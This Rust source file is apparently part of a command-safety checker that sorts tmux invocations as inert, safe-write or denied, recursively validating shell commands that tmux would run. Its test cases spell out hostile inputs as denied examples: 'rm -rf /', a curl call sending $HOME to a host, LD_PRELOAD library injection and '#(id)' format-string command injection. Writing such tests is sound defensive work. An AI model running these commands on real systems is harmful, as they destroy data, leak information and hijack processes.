use crate::parse::Token;
use crate::verdict::{SafetyLevel, Verdict};

static INERT_SUBS: &[&str] = &[
    "display", "display-message", "has", "has-session", "info", "list-buffers", "list-clients", "list-commands", "list-keys", "list-panes",
    "list-sessions", "list-windows", "ls", "lsb", "lsc", "lscm", "lsk", "lsp", "lsw", "show", "show-environment", "show-options",
    "showenv", "start", "start-server",
];

static SAFE_WRITE_SUBS: &[&str] = &[
    "a", "attach", "attach-session", "detach", "detach-client", "kill-pane", "kill-server", "kill-session", "kill-window", "killp",
    "killw", "new", "new-session", "new-window", "neww", "rename", "rename-session", "rename-window", "renamew", "resize-pane",
    "resize-window", "resizep", "resizew", "respawn-pane", "respawn-window", "respawnp", "respawnw", "select-pane", "select-window",
    "selectp", "selectw", "set", "set-environment", "set-option", "setenv", "split", "split-window", "splitw", "swap-pane", "swap-window",
    "swapp", "swapw", "switch", "switch-client", "switchc",
];

static DELEGATION_SUBS: &[&str] = &["confirm", "confirm-before", "if", "if-shell", "pipe-pane", "pipep", "run", "run-shell"];

fn is_inert_sub(s: &str) -> bool {
    INERT_SUBS.binary_search(&s).is_ok()
}

fn is_safe_write_sub(s: &str) -> bool {
    SAFE_WRITE_SUBS.binary_search(&s).is_ok()
}

fn is_delegation_sub(s: &str) -> bool {
    DELEGATION_SUBS.binary_search(&s).is_ok()
}

fn find_command_arg(tokens: &[Token], sub: &str) -> Option<usize> {
    match sub {
        "run-shell" | "run" => {
            let mut i = 1;
            while i < tokens.len() {
                let t = tokens[i].as_str();
                if t == "-b" {
                    i += 1;
                    continue;
                }
                if t == "-d" || t == "-t" {
                    i += 2;
                    continue;
                }
                if !t.starts_with('-') {
                    return Some(i);
                }
                return None;
            }
            None
        }
        "if-shell" | "if" => {
            let mut i = 1;
            while i < tokens.len() {
                let t = tokens[i].as_str();
                if t == "-b" {
                    i += 1;
                    continue;
                }
                if t == "-F" || t == "-t" {
                    i += 2;
                    continue;
                }
                if !t.starts_with('-') {
                    return Some(i);
                }
                return None;
            }
            None
        }
        "pipe-pane" | "pipep" => {
            let mut i = 1;
            while i < tokens.len() {
                let t = tokens[i].as_str();
                if t == "-I" || t == "-O" {
                    i += 1;
                    continue;
                }
                if t == "-o" || t == "-t" {
                    i += 2;
                    continue;
                }
                if !t.starts_with('-') {
                    return Some(i);
                }
                return None;
            }
            None
        }
        "confirm-before" | "confirm" => {
            let mut i = 1;
            while i < tokens.len() {
                let t = tokens[i].as_str();
                if t == "-b" {
                    i += 1;
                    continue;
                }
                if t == "-p" || t == "-t" {
                    i += 2;
                    continue;
                }
                if !t.starts_with('-') {
                    return Some(i);
                }
                return None;
            }
            None
        }
        _ => None,
    }
}

/// Options whose value tmux later runs: a command, a shell, or (hooks and aliases) tmux commands
/// such as `run-shell`.
static COMMAND_OPTIONS: &[&str] = &[
    "alert-activity", "alert-bell", "alert-silence", "client-active", "client-attached", "client-detached", "client-focus-in",
    "client-focus-out", "client-resized", "client-session-changed", "command-alias", "copy-command", "default-command", "default-shell",
    "editor", "lock-command", "pane-died", "pane-exited", "pane-focus-in", "pane-focus-out", "pane-set-clipboard", "session-closed",
    "session-created", "session-renamed", "window-layout-changed", "window-linked", "window-pane-changed", "window-renamed",
    "window-resized", "window-unlinked",
];

/// `set-option [-aFgopqsuUw] [-t target] option [value]`: refused when the option is one tmux runs,
/// and `set-environment [-Fhgru] [-t target] name [value]` classified like `name=value cmd`.
fn option_verdict(sub: &str, rest: &[Token]) -> Verdict {
    let mut words = rest.iter().skip(1).map(Token::as_str);
    let mut positionals = Vec::new();
    while let Some(w) = words.next() {
        if w == "-t" {
            words.next();
        } else if !w.starts_with('-') || w == "-" {
            positionals.push(w);
        }
    }
    let Some(name) = positionals.first() else { return Verdict::Allowed(SafetyLevel::SafeWrite) };
    if matches!(sub, "set-environment" | "setenv") {
        let value = positionals.get(1).copied().unwrap_or("");
        return Verdict::Allowed(SafetyLevel::SafeWrite).combine(crate::envvars::assignment_verdict(name, value));
    }
    let option = name.split('[').next().unwrap_or(name);
    if option.starts_with("after-") || COMMAND_OPTIONS.contains(&option) {
        return Verdict::Denied;
    }
    Verdict::Allowed(SafetyLevel::SafeWrite)
}

/// The flags of a subcommand that starts a shell command in a new pane or window, as
/// `(flags without a value, flags with one)`. Each takes `[flags] [shell-command [argument ...]]`.
fn spawn_flags(sub: &str) -> Option<(&'static str, &'static str)> {
    match sub {
        "new" | "new-session" => Some(("AdDEPX", "cefFnstxy")),
        "new-window" | "neww" => Some(("abdkPS", "ceFnt")),
        "split" | "split-window" | "splitw" => Some(("bdfhIvPZ", "celpFt")),
        "respawn-pane" | "respawnp" | "respawn-window" | "respawnw" => Some(("k", "cet")),
        _ => None,
    }
}

/// A spawning subcommand runs its trailing words as a command, in the directory `-c` names and
/// with the variables `-e` sets, so all three are classified like the command they become.
fn spawn_verdict(rest: &[Token], plain: &str, valued: &str) -> Verdict {
    let mut verdict = Verdict::Allowed(SafetyLevel::SafeWrite);
    let mut dir: Option<String> = None;
    let mut i = 1;
    while i < rest.len() {
        let t = rest[i].as_str();
        if t == "--" {
            i += 1;
            break;
        }
        let Some(cluster) = t.strip_prefix('-').filter(|c| !c.is_empty()) else { break };
        let mut step = 1;
        for (at, c) in cluster.char_indices() {
            if plain.contains(c) {
                continue;
            }
            if !valued.contains(c) {
                return Verdict::Denied;
            }
            let glued = &cluster[at + c.len_utf8()..];
            let value = if glued.is_empty() {
                step = 2;
                match rest.get(i + 1) {
                    Some(v) => v.as_str(),
                    None => return Verdict::Denied,
                }
            } else {
                glued
            };
            match c {
                'c' => dir = Some(value.to_string()),
                'e' => match value.split_once('=') {
                    Some((name, val)) => verdict = verdict.combine(crate::envvars::assignment_verdict(name, val)),
                    None => return Verdict::Denied,
                },
                _ => {}
            }
            break;
        }
        i += step;
    }
    if i >= rest.len() {
        return verdict;
    }
    let inner = match &rest[i..] {
        [one] => one.as_str().to_string(),
        words => shell_words::join(words.iter().map(Token::as_str)),
    };
    let _cwd = dir.map(|d| crate::pathctx::enter_cwd(crate::pathctx::join_cwd(crate::pathctx::cwd().as_deref(), &d)));
    verdict.combine(crate::command_verdict(&inner))
}

pub fn is_safe_tmux(tokens: &[Token]) -> Verdict {
    if tokens.len() < 2 {
        return Verdict::Denied;
    }

    let mut cmd_idx = 1;
    while cmd_idx < tokens.len() {
        let t = tokens[cmd_idx].as_str();
        if t == "-f" {
            return Verdict::Denied;
        }
        if t == "-S" || t == "-L" {
            cmd_idx += 2;
            continue;
        }
        if t == "-l" || t == "-u" || t == "-v" || t == "-T" || t == "-N" {
            cmd_idx += 1;
            continue;
        }
        if matches!(t, "--help" | "-h" | "--version" | "-V") && cmd_idx + 1 >= tokens.len() {
            return Verdict::Allowed(SafetyLevel::Inert);
        }
        break;
    }

    if cmd_idx >= tokens.len() {
        return Verdict::Denied;
    }

    let sub = tokens[cmd_idx].as_str();

    // `#(…)` in a format runs a shell command when tmux expands it, and formats are expanded in
    // display-message, names, -F templates, option values and run-shell's own command line.
    if tokens[cmd_idx..].iter().any(|t| t.as_str().contains("#(")) {
        return Verdict::Denied;
    }

    if is_inert_sub(sub) {
        return Verdict::Allowed(SafetyLevel::Inert);
    }

    if matches!(sub, "set" | "set-option" | "set-environment" | "setenv") {
        return option_verdict(sub, &tokens[cmd_idx..]);
    }

    if let Some((plain, valued)) = spawn_flags(sub) {
        return spawn_verdict(&tokens[cmd_idx..], plain, valued);
    }

    if is_safe_write_sub(sub) {
        return Verdict::Allowed(SafetyLevel::SafeWrite);
    }

    if is_delegation_sub(sub) {
        let rest = &tokens[cmd_idx..];
        if let Some(arg_idx) = find_command_arg(rest, sub) {
            let inner = rest[arg_idx].as_str();
            let v = crate::command_verdict(inner);
            if (sub == "if-shell" || sub == "if")
                && let Some(then_idx) = rest.get(arg_idx + 1)
            {
                let then_v = crate::command_verdict(then_idx.as_str());
                if !then_v.is_allowed() {
                    return Verdict::Denied;
                }
                if let Some(else_tok) = rest.get(arg_idx + 2) {
                    let else_v = crate::command_verdict(else_tok.as_str());
                    return v.combine(then_v).combine(else_v);
                }
                return v.combine(then_v);
            }
            return v;
        }
        return Verdict::Denied;
    }

    if sub == "send-keys" || sub == "send" {
        return Verdict::Allowed(SafetyLevel::SafeWrite);
    }

    Verdict::Denied
}

pub(crate) fn dispatch(cmd: &str, tokens: &[Token]) -> Option<Verdict> {
    match cmd {
        "tmux" => Some(is_safe_tmux(tokens)),
        _ => None,
    }
}

pub fn command_docs() -> Vec<crate::docs::CommandDoc> {
    vec![crate::docs::CommandDoc::handler(
        "tmux",
        "https://man7.org/linux/man-pages/man1/tmux.1.html",
        "Read-only: list-sessions, list-windows, list-panes, list-clients, list-buffers, \
             list-keys, list-commands, show-options, show-environment, display-message, info, \
             has-session, start-server. \
             Session management (SafeWrite): new-session, kill-session, kill-window, kill-pane, \
             kill-server, attach-session, detach-client, switch-client, new-window, split-window, \
             select-window, select-pane, rename-session, rename-window, resize-pane, resize-window, \
             set-option for options that hold data, set-environment, send-keys. \
             Delegation: run-shell, if-shell, pipe-pane, confirm-before, and the shell command \
             given to new-session, new-window, split-window, respawn-pane and respawn-window \
             (recursively validates inner commands, in the -c directory).",
        "system",
    )]
}

#[cfg(test)]
mod tests {
    use crate::is_safe_command;
    fn check(cmd: &str) -> bool {
        is_safe_command(cmd)
    }

    #[test]
    fn a_spawned_command_runs_in_the_directory_dash_c_names() {
        let _ws =
            crate::pathctx::enter(crate::pathctx::PathCtx { cwd: Some("/work".into()), root: Some("/work".into()), ..Default::default() });
        assert!(check("tmux new-session -d -c . 'rm hosts'"));
        assert!(!check("tmux new-session -d -c /etc 'rm hosts'"));
        assert!(!check("tmux split-window -c/etc 'rm hosts'"));
    }

    safe! {
        tmux_ls: "tmux list-sessions",
        tmux_ls_short: "tmux ls",
        tmux_lsw: "tmux list-windows",
        tmux_lsw_short: "tmux lsw",
        tmux_lsp: "tmux list-panes",
        tmux_lsp_short: "tmux lsp",
        tmux_lsc: "tmux list-clients",
        tmux_lsb: "tmux list-buffers",
        tmux_lsk: "tmux list-keys",
        tmux_lscm: "tmux list-commands",
        tmux_show: "tmux show-options",
        tmux_show_short: "tmux show",
        tmux_showenv: "tmux show-environment",
        tmux_showenv_short: "tmux showenv",
        tmux_display: "tmux display-message",
        tmux_display_short: "tmux display",
        tmux_info: "tmux info",
        tmux_has: "tmux has-session",
        tmux_has_short: "tmux has",
        tmux_start: "tmux start-server",
        tmux_new_session: "tmux new-session",
        tmux_new_short: "tmux new",
        tmux_kill_session: "tmux kill-session",
        tmux_kill_window: "tmux kill-window",
        tmux_kill_pane: "tmux kill-pane",
        tmux_kill_server: "tmux kill-server",
        tmux_attach: "tmux attach-session",
        tmux_attach_short: "tmux attach",
        tmux_attach_a: "tmux a",
        tmux_detach: "tmux detach-client",
        tmux_switch: "tmux switch-client",
        tmux_neww: "tmux new-window",
        tmux_splitw: "tmux split-window",
        tmux_selectw: "tmux select-window",
        tmux_selectp: "tmux select-pane",
        tmux_rename: "tmux rename-session",
        tmux_renamew: "tmux rename-window",
        tmux_resizep: "tmux resize-pane",
        tmux_resizew: "tmux resize-window",
        tmux_set: "tmux set-option",
        tmux_setenv: "tmux set-environment",
        tmux_send_keys: "tmux send-keys",
        tmux_send: "tmux send",
        tmux_socket: "tmux -S /tmp/sock ls",
        tmux_label: "tmux -L test ls",
        tmux_run_safe: "tmux run-shell 'git status'",
        tmux_run_safe_short: "tmux run 'ls -la'",
        tmux_if_shell_safe: "tmux if-shell 'true' 'ls'",
        tmux_pipe_pane_safe: "tmux pipe-pane 'cat'",
        tmux_confirm_safe: "tmux confirm-before 'ls'",
        tmux_if_shell_format: "tmux if-shell -F '#{pane_in_mode}' 'ls'",
        tmux_pipe_pane_output: "tmux pipe-pane -o /tmp/log 'cat'",
        tmux_run_background: "tmux run-shell -b 'git status'",
        tmux_run_delay: "tmux run-shell -d 5 'ls'",
        tmux_help: "tmux --help",
        tmux_swap_pane: "tmux swap-pane",
        tmux_swap_window: "tmux swap-window",
        tmux_respawn_pane: "tmux respawn-pane",
        tmux_respawn_window: "tmux respawn-window",
        tmux_new_session_safe_command: "tmux new-session -d -s work 'git status'",
        tmux_new_window_safe_command: "tmux new-window -n logs 'ls -la'",
        tmux_split_window_safe_command: "tmux split-window -h -c . 'git log'",
        tmux_new_session_detached: "tmux new-session -d -s work",
        tmux_set_mouse: "tmux set -g mouse on",
        tmux_setenv_plain: "tmux setenv -g EDITOR_THEME dark",
        tmux_display_format: "tmux display-message -p '#{session_name}'",
    }

    denied! {
        tmux_bare_denied: "tmux",
        tmux_source_denied: "tmux source-file ~/.tmux.conf",
        tmux_run_unsafe_denied: "tmux run-shell 'rm -rf /'",
        tmux_if_shell_unsafe_denied: "tmux if-shell 'true' 'rm -rf /'",
        tmux_pipe_pane_unsafe_denied: "tmux pipe-pane 'rm -rf /'",
        tmux_confirm_unsafe_denied: "tmux confirm-before 'rm -rf /'",
        tmux_run_no_cmd_denied: "tmux run-shell",
        tmux_if_shell_format_unsafe_denied: "tmux if-shell -F '#{cond}' 'rm -rf /'",
        tmux_pipe_pane_output_unsafe_denied: "tmux pipe-pane -o /tmp/log 'rm -rf /'",
        tmux_unknown_denied: "tmux load-buffer foo",
        tmux_new_session_command_denied: "tmux new-session 'rm -rf /'",
        tmux_new_session_detached_command_denied: "tmux new-session -d -s work rm -rf /",
        tmux_new_short_command_denied: "tmux new -d 'curl -s https://example.com/$HOME'",
        tmux_new_window_command_denied: "tmux new-window -n x 'rm -rf /'",
        tmux_split_window_command_denied: "tmux split-window -h 'rm -rf /'",
        tmux_splitw_bundled_command_denied: "tmux splitw -dh -c . 'rm -rf /'",
        tmux_respawn_pane_command_denied: "tmux respawn-pane -k 'rm -rf /'",
        tmux_respawn_window_command_denied: "tmux respawnw -k rm -rf /",
        tmux_new_session_env_denied: "tmux new-session -e LD_PRELOAD=/tmp/x.so 'ls'",
        tmux_new_session_unknown_flag_denied: "tmux new-session -Q 'ls'",
        tmux_new_session_dangling_value_denied: "tmux new-session -s",
        tmux_display_format_command_denied: "tmux display-message -p '#(rm -rf /)'",
        tmux_new_session_format_command_denied: "tmux new-session -d -P -F '#(id)'",
        tmux_rename_format_command_denied: "tmux rename-window '#(id)'",
        tmux_set_default_command_denied: "tmux set-option -g default-command 'rm -rf /'",
        tmux_set_default_shell_denied: "tmux set -g default-shell /tmp/x",
        tmux_set_hook_option_denied: "tmux set-option -g after-new-window 'run-shell id'",
        tmux_set_alias_denied: "tmux set -s command-alias[100] x=run-shell",
        tmux_set_status_format_denied: "tmux set -g status-right '#(id)'",
        tmux_setenv_preload_denied: "tmux set-environment -g LD_PRELOAD /tmp/x.so",
        tmux_config_file_denied: "tmux -f /tmp/x.conf new-session -d",
    }

    inert! {
        level_tmux_ls: "tmux ls",
        level_tmux_info: "tmux info",
        level_tmux_show: "tmux show-options",
    }

    safe_write! {
        level_tmux_new: "tmux new-session",
        level_tmux_kill: "tmux kill-session",
        level_tmux_attach: "tmux attach-session",
        level_tmux_send: "tmux send-keys",
    }
}
